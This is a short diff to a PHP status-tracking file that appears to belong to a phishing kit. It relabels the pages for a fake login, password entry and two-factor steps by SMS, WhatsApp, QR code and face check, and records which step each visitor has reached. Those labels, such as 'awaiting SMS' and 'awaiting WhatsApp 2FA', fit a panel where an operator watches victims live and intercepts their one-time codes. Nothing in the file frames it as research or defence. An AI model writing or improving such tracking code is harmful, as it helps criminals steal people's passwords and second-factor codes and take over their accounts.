@@ -27,11 +27,11 @@ require_once __DIR__ . '/status_tracker.php';
 $status_map = [
     'index.php' => 'Na Home (Desktop)',
     'login-mobile.php' => 'Na Home (Mobile)',
-    'senha.php' => 'Aguardando Senha (Desktop)',
-    'senha-mobile.php' => 'Aguardando Senha (Mobile)',
-    'dois_fatores.php' => 'Tela 2FA - Opções (Desktop)',
-    'dois_fatores2.php' => 'Tela 2FA - Opções (Desktop)',
-    'doisfatores2mobile.php' => 'Tela 2FA - Opções (Mobile)',
+    'senha.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Desktop)',
+    'senha-mobile.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Mobile)',
+    'dois_fatores.php' => 'Tela 2FA Mensagem (Desktop)',
+    'dois_fatores2.php' => 'Tela 2FA - Opções de verificação (Desktop)',
+    'doisfatores2mobile.php' => 'Tela 2FA - Opções Opções de verificação (Mobile)',
     'sms_desktop.php' => 'Aguardando SMS (Desktop)',
     'sms_mobile.php' => 'Aguardando SMS (Mobile)',
     'sms_whats_desktop.php' => 'Aguardando SMS via WhatsApp (Desktop)',
@@ -47,10 +47,8 @@ $status_map = [
     'whats2fadesktop.php' => 'Aguardando WhatsApp 2FA (Desktop)',
     'whats2framobile.php' => 'Aguardando WhatsApp 2FA (Mobile)'
 ];
-
 // Pega o nome do script atual.
 $current_page = basename($_SERVER['PHP_SELF']);
-
 // Verifica se a página atual está no mapa e atualiza o status.
 if (isset($status_map[$current_page])) {
     update_user_status($status_map[$current_page]);
